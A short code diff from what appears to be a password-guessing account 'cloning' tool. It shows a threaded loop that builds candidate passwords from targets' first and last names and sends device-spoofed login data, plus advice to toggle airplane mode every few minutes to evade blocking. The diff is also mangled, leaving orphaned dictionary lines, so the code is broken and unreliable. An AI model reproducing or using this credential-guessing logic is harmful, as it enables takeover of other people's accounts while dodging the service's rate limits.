@@ -565,18 +565,7 @@ class crack_main():
                 print(' Cloning Is Started Wait For Results')
                 print(' After Every 5 Min Turn Airplane On/Off')
                 print(50*'-')
-                with tpd(max_workers=30) as saqi:											
-			sys.stdout.write('\r [UMAR] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
-			fn = nm.split(' ')[0]
-			try:
-				ln = nm.split(' ')[1]
-			except:
-				ln = fn
-			for ps in pwx:
-				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
-				data = {"adid": str(uuid.uuid4()),
-"format": "json",
-"device_id": str(uuid.uuid4()),
+                with tpd(max_workers=30) as saqi:														
 "cpl": "true",
 "family_device_id": str(uuid.uuid4()),
 "credentials_type": "device_based_login_password",
